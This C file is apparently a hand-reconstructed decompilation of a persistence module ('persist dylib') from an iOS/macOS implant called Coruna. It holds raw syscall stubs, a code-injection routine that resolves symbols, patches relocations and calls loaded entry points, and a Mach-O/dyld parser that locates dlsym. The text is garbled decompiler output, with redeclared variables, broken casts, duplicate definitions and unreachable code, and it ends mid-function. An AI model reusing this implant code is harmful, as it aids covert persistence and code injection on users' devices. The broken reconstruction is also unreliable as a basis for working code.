/*
 * Coruna persist dylib (persist) — hand-reconstructed native C
 *
 * Rebuild: hand-reconstructed — skipped by rebuild_native_source.py
 * Standard: Framework/coruna/docs/NATIVE_SOURCE_STANDARD.md
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <IOKit/IOKitLib.h>
typedef void (*coruna_implant_trampoline_fn)(void);

static inline uint64_t coruna_u64_pack(uint32_t hi, uint32_t lo)
{
    return ((uint64_t)hi << 32) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack71(uint64_t hi7, uint8_t lo)
{
    return (hi7 << 8) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack14(uint8_t hi, uint64_t lo)
{
    return ((uint64_t)hi << 32) | (uint32_t)lo;
}

static inline uint64_t coruna_cat(uint64_t hi, uint64_t lo)
{
    return (hi << 32) | (uint32_t)lo;
}



/* Persist module runtime constants (from Mach-O image) */
static uint64_t k_persist_mmap_anon_fd;
static uint64_t k_persist_slot_4e20;
static uint64_t k_persist_slot_9030 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_1ef30 = 0x0000002000000013ULL;
static uint64_t k_persist_rodata_word_1ef60 = 0x0000000500000000ULL;
static uint64_t k_persist_rodata_word_1ef68 = 0x408f400000000000ULL;
static uint64_t k_persist_rodata_word_1ef70 = 0x0000002800000000ULL;
static uint64_t k_persist_rodata_word_1ef78 = 0x0000002000000000ULL;
static uint64_t k_persist_rodata_word_1ef80 = 0x0000000042000000ULL;
static uint64_t k_persist_rodata_word_1efa0 = 0x408a980000000000ULL;
static uint64_t k_persist_rodata_word_1efa8 = 0x0000000400000001ULL;
static uint64_t k_persist_rodata_word_1efb0 = 0x0000013400000013ULL;
static uint64_t k_persist_rodata_word_1efb8 = 0x0000001800000013ULL;
static uint64_t k_persist_rodata_word_1efc0 = 0x408c200000000000ULL;
static uint64_t k_persist_rodata_word_1efc8 = 0x000000010000009dULL;
static uint64_t k_persist_rodata_word_1eff0 = 0x0000002800001513ULL;
static uint64_t k_persist_rodata_word_1f001 = 0x0000000000000000ULL;
static uint8_t k_persist_rodata_word_1f007 = 0x00;
static uint64_t k_persist_rodata_word_1f008 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_1f010 = 0x408a900000000000ULL;
static uint64_t k_persist_rodata_word_1f018 = 0x0000000401000000ULL;
static uint64_t k_persist_rodata_word_1f020 = 0x0000000040000000ULL;
static uint64_t k_persist_rodata_word_1f028 = 0x4090ab3333333333ULL;
static uint8_t k_persist_rodata_word_1f030 = 0x01;
static uint8_t k_persist_rodata_word_1f031 = 0x00;
static uint8_t k_persist_rodata_word_1f032 = 0x00;
static uint8_t k_persist_rodata_word_1f033 = 0x00;
static uint32_t k_persist_rodata_word_1f034 = 0x00000000;
static uint64_t k_persist_rodata_word_1f038 = 0x0000000500000020ULL;
static uint64_t k_persist_rodata_word_20768 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_20798 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_207c8 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_207f8 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_20828 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_20848 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_20878 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_20898 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_208b8 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_208d8 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_208f8 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_20928 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_20958 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_20988 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_20a48 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_20a78 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_20a98 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_20ab8 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_20ad8 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_20b98 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_20c60 = 0x0000000000000000ULL;
static uint8_t k_persist_rodata_word_24018 = 0x00;
static uint8_t k_persist_rodata_word_24019 = 0x00;
static uint64_t k_persist_rodata_word_2401a = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_24020 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_24028 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_24030 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_24038 = 0x0000000032aaaba7ULL;
static uint64_t k_persist_rodata_word_24078 = 0x0000000032aaaba7ULL;
static uint64_t k_persist_rodata_word_240c0 = 0x0100000cfeedfacfULL;
static uint64_t k_persist_rodata_word_240c8 = 0x0000000600000002ULL;
static uint64_t k_persist_rodata_word_240d0 = 0x0000069800000011ULL;
static uint64_t k_persist_rodata_word_240d8 = 0x0000000000100085ULL;
static uint64_t k_persist_rodata_word_240e0 = 0x0000022800000019ULL;
static uint64_t k_persist_rodata_word_244e0 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_244e8 = 0x0000415441445f5fULL;
static uint64_t k_persist_rodata_word_244f0 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_244f8 = 0x0000000000024000ULL;
static uint64_t k_persist_rodata_word_24500 = 0x00000000000000b8ULL;
static uint64_t k_persist_rodata_word_24508 = 0x0000000300024000ULL;
static uint64_t k_persist_rodata_word_24510 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_24518 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_24520 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_24528 = 0x0000007373625f5fULL;
static uint64_t k_persist_rodata_word_24530 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_24538 = 0x0000415441445f5fULL;
static uint64_t k_persist_rodata_word_24540 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_24548 = 0x00000000000240c0ULL;
static uint64_t k_persist_rodata_word_24550 = 0x00000000000004e0ULL;
static uint64_t k_persist_rodata_word_24558 = 0x0000000400000000ULL;
static uint64_t k_persist_rodata_word_24560 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_24568 = 0x0000000000000001ULL;
static uint64_t k_persist_rodata_word_24570 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_24578 = 0x0000004800000019ULL;
static uint64_t k_persist_rodata_word_24580 = 0x44454b4e494c5f5fULL;
static uint64_t k_persist_rodata_word_24588 = 0x0000000000005449ULL;
static uint64_t k_persist_rodata_word_24590 = 0x0000000000028000ULL;
static uint64_t k_persist_rodata_word_24598 = 0x0000000000008000ULL;
static uint64_t k_persist_rodata_word_1ef40 = 0xffffffffffffffffULL;
static uint64_t k_persist_rodata_word_1ef50 = 0x0000000000000000ULL;
static uint64_t k_persist_rodata_word_1ef90 = 0x0000000e00000001ULL;
static uint64_t k_persist_rodata_word_1efd0 = 0x0000000000000008ULL;
static uint64_t k_persist_rodata_word_1efe0 = 0x000000000000000aULL;
static uint64_t k_persist_rodata_word_1eff8 = 0x0000000000001000ULL;
static uint64_t k_persist_rodata_word_240c8 = 0x0000000600000002ULL;
static uint64_t k_persist_rodata_word_240d8 = 0x0000000000100085ULL;
static void *PTR_DAT_00020400 = (void *)0x00080000000244f0ULL;
static void *ptr_persist_fn_209a8 = (void *)0x8008000000016da0ULL;
static void *ptr_persist_fn_20a28 = (void *)0x8008000000015438ULL;
static void *ptr_persist_fn_20af8 = (void *)0x80080000000190b0ULL;
static void *ptr_persist_fn_20b80 = (void *)0x8008000000016da0ULL;
static void *ptr_persist_fn_20c48 = (void *)0x800800000001962cULL;
static void *ptr_persist_fn_24000 = (void *)0x8008000000018968ULL;
static void *k_persist_nsconcreteglobalblock_slot = (void *)0xc0156ae100000002ULL;
static void *k_persist_nsconcreteglobalblock_slot = (void *)0xc0156ae100000002ULL;
static void *k_persist_nsconcretestackblock_slot = (void *)0x4008000000000003ULL;
static void *k_persist_chkstk_darwin_slot = (void *)0xc008000000000009ULL;
static void *k_persist_chkstk_darwin_slot = (void *)0xc008000000000009ULL;
static void *k_persist_cxa_finalize_ranges_slot = (void *)0xc00800000000000bULL;
static void *k_persist_stack_chk_guard_slot = (void *)0x4008000000000011ULL;
static void *k_persist_dladdr_slot = (void *)0x400800000000001bULL;
static void *k_persist_dlsym_slot = (void *)0x400800000000001fULL;
static void *k_persist_dyldversionnumber_slot = (void *)0x4008000000000020ULL;
static void *k_persist_mach_task_self_slot = (void *)0x4008000000000034ULL;
static void *k_persist_strcmp_slot = (void *)0x400800000000005eULL;
static void *k_persist_task_get_exc_guard_behavior_slot = (void *)0xc008000000000069ULL;
static void *k_persist_task_set_exc_guard_behavior_slot = (void *)0xc00800000000006bULL;
static void *k_persist_vm_page_mask_slot = (void *)0x4008000000000074ULL;
static void *PTR_s__000205b0 = (void *)0x001000000001f1c0ULL;
static void *PTR_s__000205c0 = (void *)0x001000000001f1c0ULL;
static void *PTR_s_dlopen_00020408 = (void *)0x001000000001f0caULL;
static void *PTR_s_launchd_000205d0 = (void *)0x000800000001f1e4ULL;
coruna_svc_regpack_t coruna_bsdthread_create(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_bsdthread_terminate(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}





void coruna_mach_port_construct(void)
{
  CallSupervisor(0x80);
  return;
}





void coruna_mach_reply_port(void)
{
  CallSupervisor(0x80);
  return;
}





void coruna_thread_self(void)
{
  CallSupervisor(0x80);
  return;
}





void coruna_task_self(void)
{
  CallSupervisor(0x80);
  return;
}





void coruna_mach_port_deallocate(void)
{
  CallSupervisor(0x80);
  return;
}





void coruna_mach_msg(void)
{
  CallSupervisor(0x80);
  return;
}





void coruna_mach_msg2(void)
{
  CallSupervisor(0x80);
  return;
}





void coruna_mach_vm_deallocate(void)
{
  CallSupervisor(0x80);
  return;
}





void coruna_mach_port_mod_refs(void)
{
  CallSupervisor(0x80);
  return;
}





uint64_t coruna_persist_via_identity_80bc(uint64_t *val)
{
  void (*ptr)(void);
  uint64_t u;
  unsigned long size;
  
  if (val == (uint64_t *)0x0) {
    u = 0xad001;
  }
  else if (*(char *)(val + 0x13) == '\0') {
    u = 0;
  }
  else {
    if (*(int *)(val + 0xd) != 0) {
      size = 0;
      do {
        ptr = (void (*)coruna_identity_80bc(*(uint64_t *)(val[0xc] + size * 8),0);
        (*ptr)();
        size = size + 1;
      } while (size < *(uint *)(val + 0xd));
    }
    coruna_persist_residual_42(*val,*(uint32_t *)(val + 1));
    u = 0;
    *(uint8_t *)(val + 0x13) = 0;
  }
  return u;
}





uint64_t *
uint64_t * coruna_persist_inject(int64_t *arg,uint64_t val,uint64_t id_2,uint64_t size_3, uint32_t *size)
{
  uint32_t *ptr;
  uint u;
  char err;
  int err;
  uint64_t *buf;
  long handle;
  void (*ptr)(void);
  char *buf;
  long *ptr;
  long addr;
  long off;
  unsigned long size;
  long base;
  long ctx_val;
  uint32_t scratch;
  long bootargs;
  uint64_t thread_attr;
  uint32_t *host_info;
  uint64_t *serial_buf;
  uint64_t *action;
  uint64_t block_ctx;
  
  if (arg == (long *)0x0) {
    return (uint64_t *)0xad001;
  }
  err = coruna_buf_valid(val);
  if (err == 0) {
    return (uint64_t *)0xad001;
  }
  err = coruna_slice_valid(id_2);
  if (err == 0) {
    return (uint64_t *)0xad001;
  }
  bootargs = 0;
  ptr = &scratch;
  if (size != (uint32_t *)0x0) {
    ptr = size;
  }
  *ptr = 4;
  buf = (uint64_t *)coruna_persist_build_ctx(&bootargs,val,id_2,size_3);
  if ((int)buf != 0) {
    return buf;
  }
  *ptr = 5;
  addr = bootargs;
  if (bootargs == 0) {
    buf = (uint64_t *)0xad001;
  }
  else {
    if (*(int *)(bootargs + 0x28) == 0) {
      *ptr = 6;
    }
    else {
      off = 0;
      size = 0;
      do {
        base = *(long *)(addr + 0x20);
        handle = coruna_call_webbookmarks_delete(*(uint64_t *)(base + off),8);
        ctx_val = bootargs;
        if (handle == 0) {
          buf = (uint64_t *)0x1f00f;
          coruna_persist_ctx_free(bootargs);
          return buf;
        }
        *(long *)(base + off + 8) = handle;
        size = size + 1;
        off = off + 0x10;
      } while (size < *(uint *)(addr + 0x28));
      *ptr = 6;
      addr = ctx_val;
      if (ctx_val == 0) {
        buf = (uint64_t *)0xad001;
        coruna_persist_ctx_free(bootargs);
        return buf;
      }
    }
    if (*(int *)(addr + 0x38) != 0) {
      off = 0;
      size = 0;
      do {
        ctx_val = *(long *)(addr + 0x30);
        if (ctx_val == 0) {
          buf = (uint64_t *)0xad001;
          coruna_persist_ctx_free(bootargs);
          return buf;
        }
        handle = *(long *)(*(long *)(ctx_val + off + 0x20) + 8);
        if (handle == 0) {
          buf = &k_persist_rodata_word_1f010;
          coruna_persist_ctx_free(bootargs);
          return buf;
        }
        buf = *(char **)(ctx_val + off + 0x10);
        if (*buf == '_') {
          buf = buf + 1;
        }
        handle = coruna_call_webbookmarks_delete(handle,buf);
        if (handle == 0) {
          if (*(char *)(ctx_val + off + 0x28) == '\0') {
            buf = (uint64_t *)0x1f011;
            coruna_persist_ctx_free(bootargs);
            return buf;
          }
          handle = 0;
        }
        else {
          handle = *(long *)(ctx_val + off + 0x18) + handle;
        }
        ptr = *(long **)(ctx_val + off);
        err = *(char *)((uint64_t *)(ctx_val + off) + 1);
        if (err == '\x03') {
          *(int *)ptr = ((int)handle - (int)ptr) + -4;
        }
        else if (err == '\x02') {
          *(int *)ptr = (int)handle;
        }
        else {
          if (err != '\x01') {
            buf = (uint64_t *)0x91000e;
            coruna_persist_ctx_free(bootargs);
            return buf;
          }
          *ptr = handle;
        }
        size = size + 1;
        off = off + 0x30;
      } while (size < *(uint *)(addr + 0x38));
    }
    u = *(uint *)(addr + 0x48);
    if (u != 0) {
      off = 0;
      do {
        if (*(long *)(addr + 0x40) == 0) {
          buf = (uint64_t *)0xad001;
          coruna_persist_ctx_free(bootargs);
          return buf;
        }
        ptr = (long *)(*(long *)(addr + 0x40) + off);
        if ((long *)*ptr == (long *)0x0 || ptr[2] == 0) {
          buf = (uint64_t *)0xad001;
          coruna_persist_ctx_free(bootargs);
          return buf;
        }
        switch((unsigned long)ptr[1] >> 0x31 & 3) {
        default:
          break;
        case 1:
          break;
        case 2:
          break;
        case 3:
          break;
        }
        *(long *)*ptr = ptr[2];
        off = off + 0x18;
      } while ((unsigned long)u * 0x18 - off != 0);
    }
    buf = (uint64_t *)coruna_persist_str_if_uvar6_uvar3(bootargs);
    if ((int)buf == 0) {
      coruna_log_msg(id_2);
      *ptr = 7;
      addr = bootargs;
      buf = (uint64_t *)0xad001;
      if (bootargs != 0) {
        if (*(int *)(bootargs + 0x58) != 0) {
          size = 0;
          buf = (uint64_t *)(bootargs + 0x70);
          do {
            host_info = *(uint32_t **)(addr + 0x78);
            thread_attr = *buf;
            action = *(uint64_t **)(addr + 0x88);
            serial_buf = *(uint64_t **)(addr + 0x80);
            block_ctx = *(uint64_t *)(addr + 0x90);
            ptr = (void (*)coruna_identity_80bc(*(uint64_t *)(*(long *)(addr + 0x50) + size * 8),0);
            (*ptr)(*host_info,*serial_buf,*action,0,&thread_attr);
            size = size + 1;
          } while (size < *(uint *)(addr + 0x58));
        }
        *(uint8_t *)(addr + 0x98) = 1;
        *arg = bootargs;
        return (uint64_t *)0x0;
      }
    }
  }
done:
  coruna_persist_ctx_free(bootargs);
  return buf;
}





void coruna_call_webbookmarks_delete(void)
{
  coruna_persist_str_corefoundation();
  return;
}





void coruna_persist_residual_41(void)
{
  coruna_implant_trampoline_fn indirect_target;
  (*indirect_target)();
  return;
}





void coruna_surface_dispatch_thunk(void)
{
  void (*ptr)(void);
  ptr = (void (*)UndefinedInstructionException(0x11,0x10);
  (*ptr)();
}





bool coruna_cf_bundle(void)
{
  bool err;
  uint u;
  int err;
  long handle;
  unsigned long size;
  uint version;
  char scratch [8];
  char scratch [8];
  
  u = coruna_driver_dispatch();
  if (u == 0) {
    err = false;
  }
  else {
    err = false;
    version = 0;
    do {
      handle = coruna_dyld_cached_port_ptr(version);
      if (handle == 0) {
fail:
        if (err) {
          return true;
        }
      }
      else {
        err = coruna_driver_copy_port_1918(handle,"CoreFoundation");
        if (err == 0) {
          return true;
        }
        scratch[0] = s__CoreFoundation_0001f04f[8];
        scratch[1] = s__CoreFoundation_0001f04f[9];
        scratch[2] = s__CoreFoundation_0001f04f[10];
        scratch[3] = s__CoreFoundation_0001f04f[0xb];
        scratch[4] = s__CoreFoundation_0001f04f[0xc];
        scratch[5] = s__CoreFoundation_0001f04f[0xd];
        scratch[6] = s__CoreFoundation_0001f04f[0xe];
        scratch[7] = s__CoreFoundation_0001f04f[0xf];
        scratch[0] = s__CoreFoundation_0001f04f[0];
        scratch[1] = s__CoreFoundation_0001f04f[1];
        scratch[2] = s__CoreFoundation_0001f04f[2];
        scratch[3] = s__CoreFoundation_0001f04f[3];
        scratch[4] = s__CoreFoundation_0001f04f[4];
        scratch[5] = s__CoreFoundation_0001f04f[5];
        scratch[6] = s__CoreFoundation_0001f04f[6];
        scratch[7] = s__CoreFoundation_0001f04f[7];
        size = coruna_driver_free_ctx(handle);
        if (0xe < size) {
          err = coruna_driver_copy_port_1918(size + handle + -0xf,scratch);
          err = err == 0;
          if (err) {
            return true;
          }
        }
        err = false;
      }
      version = version + 1;
    } while (version < u);
  }
  return err;
}





uint64_t * coruna_resolve_dyld_dlsym(unsigned long arg,long *handle)
{
  int *err;
  long handle;
  uint u;
  unsigned long size;
  byte err;
  int *status;
  int *flags;
  int *count;
  bool status;
  byte flags;
  int err;
  int status;
  uint64_t *ptr;
  uint version;
  byte *ptr;
  byte *buf;
  uint *buf;
  uint *str;
  int *idx;
  long *str;
  byte *copy;
  long addr;
  int *i;
  char *ptr;
  int *j;
  unsigned long port;
  unsigned long tag;
  unsigned long kind;
  unsigned long type_id;
  int *scratch;
  int *bootargs;
  long thread_attr;
  unsigned long host_info;
  uint64_t serial_buf;
  
  if (handle == (long *)0x0) {
    return &k_persist_rodata_word_1f018;
  }
  if ((arg & 1) == 0) {
    serial_buf = (byte *)0x0;
    err = coruna_msu_mnt1_path(0,&serial_buf);
    if (((err == 0) && (copy = *(byte **)((long)serial_buf + 0x20), copy != (byte *)0x0)) &&
       (*(int *)copy == -0x1120531)) {
      ptr = copy + 0x20;
      buf = ptr + *(uint *)(copy + 0x14);
      if ((0x47 < *(uint *)(copy + 0x14) && ptr < buf) && (ptr <= buf + -0x48)) {
        err = 0;
        type_id = 0;
        tag = 0;
        do {
          port = type_id;
          kind = tag;
          if ((*(int *)ptr == 0x19) &&
             (err = coruna_driver_copy_port_1918(ptr + 8,"__PAGEZERO"), err != 0)) {
            size = *(unsigned long *)(ptr + 0x18);
            status = (bool)(size < tag | err ^ 1);
            err = status | err;
            kind = size;
            if (!status) {
              kind = tag;
            }
            port = *(long *)(ptr + 0x20) + size;
            if (*(long *)(ptr + 0x20) + size <= type_id) {
              port = type_id;
            }
          }
          ptr = ptr + *(uint *)(ptr + 4);
          type_id = port;
          tag = kind;
        } while (ptr <= buf + -0x48);
        type_id = port - kind;
        if (((bool)(err & (kind <= port && type_id != 0))) && (type_id < 0xffffffff)) {
          version = (uint)type_id;
          bool dlsym_match = false;
          if (version >= 0xe) {
            if (version >= 0x17) {
              serial_buf = copy;
              if (copy < copy + (version - 0x16) + 1) {
                do {
                  if (*serial_buf == 0x5f) {
                    addr = 1;
                    while (serial_buf[addr] == "__dyld_dlsym_internal"[addr]) {
                      addr = addr + 1;
                      if (addr == 0x16) {
                        dlsym_match = true;
                        break;
                      }
                    }
                  }
                  if (dlsym_match) break;
                  status = serial_buf < copy + (version - 0x16);
                  serial_buf = serial_buf + 1;
                } while (status);
              }
            }
            if (!dlsym_match) {
              serial_buf = copy;
              if (copy < copy + (version - 0xd) + 1) {
                do {
                  if (*serial_buf == 0x5f) {
                    addr = 1;
                    while (serial_buf[addr] == "__dyld_dlsym"[addr]) {
                      addr = addr + 1;
                      if (addr == 0xd) {
                        dlsym_match = true;
                        break;
                      }
                    }
                  }
                  if (dlsym_match) break;
                  status = serial_buf < copy + (version - 0xd);
                  serial_buf = serial_buf + 1;
                } while (status);
              }
            }
          }
          if (dlsym_match) {
            if (8 < version) {
              ptr = copy + (unsigned long)(version - 8) + 1;
              for (; copy < ptr; copy = copy + 8) {
                if ((uint)*copy == ((uint)serial_buf & 0xff)) {
                  addr = 1;
                  while (copy[addr] == *(byte *)((long)&serial_buf + addr)) {
                    addr = addr + 1;
                    if (addr == 8) {
                      if ((*(void (**)(copy + 8) == (void (*)0x0) ||
                         (addr = (**(void (**)(copy + 8))(0xfffffffffffffffe,"dlsym",0), addr == 0))) {
                        break;
                      }
                      *handle = addr;
                      return (uint64_t *)0x0;
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
done:
  serial_buf = (byte *)0x0;
  ptr = (uint64_t *)coruna_msu_mnt1_path(arg,&serial_buf);
  if ((int)ptr != 0) {
    return ptr;
  }
  version = *(uint *)((long)serial_buf + 4);
  if (version == 0) {
    return (uint64_t *)0x1f01b;
  }
  str = *(long **)((long)serial_buf + 8);
  if (str == (long *)0x0) {
    return (uint64_t *)0x1f01c;
  }
  type_id = 1;
  do {
    if (((*str == 0) || (str[1] == 0)) ||
       (err = coruna_driver_copy_port_1918(str[1],"/usr/lib/system/libdyld.dylib"), err != 0)) {
      addr = 0;
    }
    else {
      addr = *str;
      if (addr != 0) break;
    }
    str = str + 3;
    status = type_id < version;
    type_id = type_id + 1;
  } while (status);
  if (addr == 0) {
    return (uint64_t *)0x1f019;
  }
  j = (int *)(addr + 0x20);
  err = (int *)((long)j + (unsigned long)*(uint *)(addr + 0x14));
  if (err <= j) {
    return (uint64_t *)0x1f02e;
  }
  scratch = (int *)0x0;
  bootargs = (int *)0x0;
  idx = (int *)0x0;
  i = (int *)0x0;
  do {
    status = j + 2;
    if (err < status) {
      return (uint64_t *)0x1f02d;
    }
    version = j[1];
    if (version < 8 || err < (int *)((long)j + (unsigned long)version)) {
      return (uint64_t *)0x1f02d;
    }
    err = *j;
    flags = scratch;
    count = bootargs;
    if (err < 0x19) {
      if (err == -0x7fffffde) {
skip:
        u = 0x1f02d;
        if (0x2f < version) {
          u = 0;
        }
        ptr = (uint64_t *)(unsigned long)u;
        idx = j;
      }
      else {
        u = 0x1f02d;
        if (0xf < version) {
          u = 0;
        }
        status = j;
        if (err != -0x7fffffcd) {
          u = 0;
          status = i;
        }
        i = status;
        ptr = (uint64_t *)(unsigned long)u;
      }
    }
    else {
      if (err == 0x22) goto skip;
      if (err == 0x19) {
        if (version < 0x48) {
          return (uint64_t *)0x1f02d;
        }
        ptr = (uint64_t *)coruna_driver_copy_port_1918(status,"__TEXT");
        flags = j;
        if ((int)ptr != 0) {
          err = coruna_driver_copy_port_1918(status,"__LINKEDIT");
          ptr = (uint64_t *)0x0;
          flags = scratch;
          count = j;
          if (err != 0) {
            count = bootargs;
          }
        }
      }
      else {
        ptr = (uint64_t *)0x0;
      }
    }
    bootargs = count;
    scratch = flags;
  } while (((int)ptr == 0) &&
          (j = (int *)((long)j + (unsigned long)(uint)j[1]), j < err));
  if ((int)ptr != 0) {
    return ptr;
  }
  if (scratch == (int *)0x0) {
    return (uint64_t *)0x1f02e;
  }
  if (bootargs == (int *)0x0) {
    return (uint64_t *)0x1f02f;
  }
  if ((idx == (int *)0x0) && (i == (int *)0x0)) {
    return (uint64_t *)&k_persist_rodata_word_1f030;
  }
  type_id = *(unsigned long *)(bootargs + 8);
  if (idx == (int *)0x0) {
    return (uint64_t *)&k_persist_rodata_word_1f034;
    str = (uint *)(i + 2);
    buf = (uint *)(i + 3);
  }
  else {
    str = (uint *)(idx + 10);
    buf = (uint *)(idx + 0xb);
  }
  version = *buf;
  if (version != 0) {
    tag = (unsigned long)*str - *(unsigned long *)(bootargs + 10);
    if ((unsigned long)*str < *(unsigned long *)(bootargs + 10) || tag == 0) {
      return (uint64_t *)&k_persist_rodata_word_1f033;
    }
    if (type_id <= tag) {
      return (uint64_t *)&k_persist_rodata_word_1f033;
    }
    if (type_id < version) {
      return (uint64_t *)&k_persist_rodata_word_1f033;
    }
    kind = tag + version;
    if (type_id < kind) {
      return (uint64_t *)&k_persist_rodata_word_1f033;
    }
    handle = (addr - *(long *)(scratch + 6)) + *(long *)(bootargs + 6);
    if ((handle != 0) && ((long)tag < (long)kind)) {
      host_info = 0;
      err = 0;
      copy = (byte *)(handle + kind);
      ptr = "_dlsym";
      while (serial_buf = (byte *)(handle + tag + host_info), serial_buf < copy) {
        host_info = 0;
        status = coruna_return_zero_6d64(&serial_buf,copy,&host_info);
        if (status == 0) break;
        if (host_info == 0) {
          buf = (byte *)0x0;
          ptr = (byte *)0x0;
        }
        else {
          if ((long)host_info < 0) break;
          ptr = serial_buf + host_info;
          buf = serial_buf;
        }
        serial_buf = serial_buf + host_info;
        if (copy <= serial_buf) break;
        if (*ptr == '\0') {
          if (buf == (byte *)0x0) break;
          host_info = 0;
          if (ptr <= copy) {
            copy = ptr;
          }
          thread_attr = 0;
          serial_buf = buf;
          err = coruna_return_zero_6d64(&serial_buf,copy,&host_info);
          if ((err == 0) ||
             (type_id = coruna_return_zero_6d64(&serial_buf,copy,&thread_attr), (type_id & 1) == 0)) break;
          if (1 < (host_info & 3)) {
            if ((host_info & 3) != 2) break;
            addr = 0;
          }
          if (thread_attr == 0) {
            return (uint64_t *)&k_persist_rodata_word_1f032;
          }
          if (addr + thread_attr == 0) {
            return (uint64_t *)&k_persist_rodata_word_1f031;
          }
          addr = coruna_identity_80bc(addr + thread_attr,0);
check_ok:
          *handle = addr;
          return (uint64_t *)0x0;
        }
        err = *serial_buf;
        serial_buf = serial_buf + 1;
        if (err == 0 || copy <= serial_buf) break;
        version = 0;
        while( true ) {
          type_id = 0;
          status = true;
          ptr = serial_buf;
          while( true ) {
            if (*ptr == 0) break;
            if (status == false) {
              status = false;
            }
            else {
              status = *ptr == ptr[type_id];
            }
            type_id = (unsigned long)((int)type_id + 1);
            ptr = serial_buf + type_id;
            if (copy <= ptr) goto retry;
          }
          serial_buf = serial_buf + ((int)type_id + 1);
          host_info = 0;
          flags = coruna_return_zero_6d64(&serial_buf,copy,&host_info);
          if ((flags & status) != 0) break;
          version = version + 1;
          if ((flags & version < err) != 1 || copy <= serial_buf) goto retry;
        }
        ptr = ptr + type_id;
        err = err + 1;
        if (err == 0x65) break;
      }
    }
retry:
    return (uint64_t *)&k_persist_rodata_word_1f032;
  }
next:
  return (uint64_t *)&k_persist_rodata_word_1f034;
}





uint64_t * coruna_msu_mnt1_path(uint64_t val,long *handle)
{
  int err;
  uint64_t u;
  uint64_t *ptr;
  int scratch;
  long bootargs [2];
  uint32_t thread_attr;
  
  ptr = (uint64_t *)0x1f014;
  if (handle == (long *)0x0) {
    ptr = &k_persist_rodata_word_1f018;
  }
  else {
    u = coruna_persist_via_mach_port_deallocate();
    if ((int)u + 1U < 2) {
      ptr = (uint64_t *)0x1f017;
    }
    else {
      bootargs[0] = 0;
      bootargs[1] = 0;
      thread_attr = 0;
      scratch = 5;
      err = coruna_persist_via_memcpy(u,0x11,bootargs,&scratch,val);
      if (err == 0) {
        if (scratch == 5) {
          if (bootargs[0] != 0) {
            ptr = (uint64_t *)0x0;
            *handle = bootargs[0];
          }
        }
        else {
          ptr = (uint64_t *)0x1f015;
        }
      }
      else {
        ptr = (uint64_t *)0x1f016;
      }
    }
  }
  return ptr;
}





uint8_t coruna_return_zero_6d64(uint64_t *val,byte *arg,unsigned long *arg_x)
{
  byte err;
  uint8_t u;
  unsigned long size;
  byte *ptr;
  unsigned long version;
  byte *buf;
  
  u = 0;
  if (val != (uint64_t *)0x0) {
    ptr = (byte *)*val;
    if (ptr == (byte *)0x0 || arg == (byte *)0x0) {
      return 0;
    }
    if (ptr < arg) {
      version = 0;
      size = 0;
      {
        bool leb_done = false;
        do {
          buf = ptr + 1;
          err = *ptr;
          size = ((unsigned long)err & 0x7f) << (version & 0x3f) | size;
          if ((-1 < (char)err) || (arg <= buf)) {
            if ((char)err < '\0') {
              u = 0;
            }
            else {
              u = 1;
              *val = buf;
              if (arg_x != (unsigned long *)0x0) {
                *arg_x = size;
              }
            }
            leb_done = true;
            break;
          }
          version = version + 7;
          ptr = buf;
        } while ((int)version - 7U < 0x39);
        if (!leb_done) {
          u = 0;
          if (-1 < (char)err) {
            *val = buf;
            if (arg_x != (unsigned long *)0x0) {
              *arg_x = size;
            }
          }
        }
      }
    }
    else {
      u = 0;
    }
  }
  return u;
}





uint64_t *
uint64_t * coruna_persist_via_persist_inject(int64_t arg,int64_t arg,uint64_t val,uint64_t *id_2,uint64_t size_3)
{
  int err;
  uint64_t *ptr;
  uint64_t scratch;
  
  ptr = &k_persist_rodata_word_1f018;
  if (((arg != 0) && (arg != 0)) && (id_2 != (uint64_t *)0x0)) {
    err = coruna_buf_valid();
    if (err == 0) {
